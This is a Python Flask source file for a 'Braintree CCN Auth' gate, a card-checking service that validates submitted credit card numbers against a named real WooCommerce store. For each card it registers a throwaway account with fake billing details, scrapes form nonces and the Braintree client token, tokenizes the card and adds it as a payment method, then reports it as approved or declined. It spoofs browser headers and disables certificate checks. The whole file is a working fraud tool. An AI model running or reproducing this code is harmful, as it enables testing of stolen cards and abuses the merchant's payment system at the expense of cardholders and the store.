from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
import re
import json
import base64
import uuid
import time
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

app = Flask(__name__)

TARGET_HOST = 'bostonmolecules.com'
BASE_URL = f'https://{TARGET_HOST}'


def get_headers(referer_path):
    return {
        'host': TARGET_HOST,
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': f'{BASE_URL}{referer_path}',
        'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'priority': 'u=0, i',
    }


def get_post_headers(referer_path):
    h = get_headers(referer_path)
    h['content-type'] = 'application/x-www-form-urlencoded'
    h['origin'] = BASE_URL
    return h


@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'online',
        'gate': 'Braintree CCN Auth',
        'usage': '/braintree-ccn?cc=4111111111111111|12|26|123',
        'example': '/braintree-ccn?cc=4111111111111111|12|26|123'
    })


@app.route('/braintree-ccn', methods=['GET'])
def braintree_ccn():
    start_time = time.time()

    cc_param = request.args.get('cc', '').strip()

    if not cc_param:
        return jsonify({
            'status': 'error',
            'response': 'Missing cc parameter',
            'message': 'Usage: ?cc=4111111111111111|12|26|123'
        }), 400

    parts = cc_param.split('|')
    if len(parts) < 4:
        return jsonify({
            'status': 'error',
            'response': 'Invalid cc format',
            'message': 'Format: cc|mm|yy|cvv'
        }), 400

    cc = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    cvv = parts[3].strip()

    if len(yy) == 4:
        yy = yy[-2:]

    random_email = f"user{uuid.uuid4().hex[:8]}@example.com"
    session = requests.Session()

    try:
        # STEP 1: GET my-account for register nonce
        headers = get_headers('/my-account/add-payment-method/')
        response = session.get(f'{BASE_URL}/my-account/', headers=headers, timeout=30, verify=False)

        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find('input', {'name': 'woocommerce-register-nonce'})
        register_nonce = nonce_input['value'] if nonce_input else ''

        # STEP 2: POST register
        headers = get_post_headers('/my-account/')
        data = {
            'email': random_email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': f'{BASE_URL}/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': '2026-09-14+04:41:18',
            'wc_order_attribution_session_pages': '4',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0+(Linux;+Android+10;+K)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/150.0.0.0+Mobile+Safari/537.36',
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        session.post(f'{BASE_URL}/my-account/', headers=headers, data=data, timeout=30, verify=False)

        # STEP 3: GET edit-address billing for nonce
        headers = get_headers('/my-account/edit-address/')
        response = session.get(f'{BASE_URL}/my-account/edit-address/billing/', headers=headers, timeout=30, verify=False)

        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find('input', {'id': 'woocommerce-edit-address-nonce'})
        edit_address_nonce = nonce_input['value'] if nonce_input else ''

        # STEP 4: POST billing address
        headers = get_post_headers('/my-account/edit-address/billing/')
        data = (
            f'billing_first_name=Erik&billing_last_name=Ragara&billing_company'
            f'&billing_country=US&billing_address_1=123%2BAllen%2BStreet&billing_address_2'
            f'&billing_city=New%2BYork&billing_state=NY&billing_postcode=10001'
            f'&billing_phone=12012455464&billing_email={random_email}'
            f'&save_address=Save%2Baddress'
            f'&woocommerce-edit-address-nonce={edit_address_nonce}'
            f'&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F'
            f'&action=edit_address'
        )
        session.post(
            f'{BASE_URL}/my-account/edit-address/billing/',
            headers=headers,
            data=data,
            timeout=30,
            verify=False
        )

        # STEP 5: GET add-payment-method for nonce + braintree token
        headers = get_headers('/my-account/payment-methods/')
        response = session.get(f'{BASE_URL}/my-account/add-payment-method/', headers=headers, timeout=30, verify=False)

        soup = BeautifulSoup(response.text, 'html.parser')
        script_tag = soup.find('script', string=re.compile(r'wc_braintree_client_token'))

        auth = None
        if script_tag:
            match = re.search(r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]', script_tag.string)
            if match:
                client_token = match.group(1)
                try:
                    decoded = json.loads(client_token)
                    auth = decoded.get('authorizationFingerprint', '')
                except json.JSONDecodeError:
                    try:
                        decoded_json = json.loads(base64.b64decode(client_token).decode('utf-8'))
                        auth = decoded_json.get('authorizationFingerprint', '')
                    except Exception:
                        auth = None

        if not auth:
            elapsed = round(time.time() - start_time, 2)
            return jsonify({
                'status': 'error',
                'response': 'No auth fingerprint found',
                'time': elapsed
            })

        nonce_input = soup.find('input', id='woocommerce-add-payment-method-nonce')
        add_payment_nonce = nonce_input['value'] if nonce_input else ''

        # STEP 6: Braintree GraphQL tokenize
        url = "https://payments.braintree-api.com/graphql"
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(uuid.uuid4())
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "billingAddress": {
                            "postalCode": "10001",
                            "streetAddress": "123 Allen Street"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        braintree_headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Windows"',
            'authorization': f"Bearer {auth}",
            'braintree-version': "2018-05-10",
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': "?0",
            'origin': "https://assets.braintreegateway.com",
            'sec-fetch-site': "cross-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://assets.braintreegateway.com/",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i"
        }

        bt_response = requests.post(
            url,
            data=json.dumps(payload),
            headers=braintree_headers,
            timeout=30,
            verify=False
        )
        result = bt_response.json()
        token = result.get('data', {}).get('tokenizeCreditCard', {}).get('token', '')

        if not token:
            elapsed = round(time.time() - start_time, 2)
            return jsonify({
                'status': 'error',
                'response': 'Tokenization failed',
                'time': elapsed
            })

        # STEP 7: POST add payment method with token
        headers = get_post_headers('/my-account/add-payment-method/')
        data = (
            f'payment_method=braintree_cc'
            f'&braintree_cc_nonce_key={token}'
            f'&braintree_cc_device_data=%7B%22correlation_id%22%3A%2246f3aaa9-2be9-4df3-89e5-1d59ce24%22%7D'
            f'&braintree_cc_3ds_nonce_key'
            f'&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F67b3frts3pmnhcfw%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F67b3frts3pmnhcfw%22%7D%2C%22merchantId%22%3A%2267b3frts3pmnhcfw%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22challenges%22%3A%5B%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22American%2BExpress%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22paypalEnabled%22%3Afalse%7D'
            f'&woocommerce-add-payment-method-nonce={add_payment_nonce}'
            f'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F'
            f'&woocommerce_add_payment_method=1'
        )

        response = session.post(
            f'{BASE_URL}/my-account/add-payment-method/',
            headers=headers,
            data=data,
            timeout=60,
            verify=False
        )

        # STEP 8: Parse result
        soup = BeautifulSoup(response.text, 'html.parser')

        success_div = soup.find('div', class_='woocommerce-message')
        error_div = soup.find('ul', class_='woocommerce-error')

        approved = False
        response_msg = "Unknown response"

        if success_div and ('Payment method successfully added' in success_div.text or
                            'Invalid postal code or street address' in success_div.text):
            approved = True
            response_msg = "000-Success"
        elif error_div:
            error_msg = error_div.text.strip()

            if 'Invalid postal code or street address' in error_msg:
                approved = True
                response_msg = "Invalid postal code or street address"
            else:
                reason_match = re.search(r'Reason:\s*(.+?)(?:\.|$)', error_msg)
                if reason_match:
                    response_msg = reason_match.group(1).strip()
                else:
                    response_msg = error_msg
        else:
            response_msg = "No status message found"

    except requests.exceptions.Timeout:
        elapsed = round(time.time() - start_time, 2)
        return jsonify({
            'status': 'error',
            'response': 'Request timeout',
            'time': elapsed
        })
    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        return jsonify({
            'status': 'error',
            'response': f'Error: {str(e)}',
            'time': elapsed
        })

    elapsed = round(time.time() - start_time, 2)
    masked_card = cc[:6] + '****' + cc[-4:] if len(cc) >= 10 else cc

    return jsonify({
        'status': 'approved' if approved else 'declined',
        'response': response_msg,
        'cc': masked_card,
        'time': elapsed
    })


@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok'})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
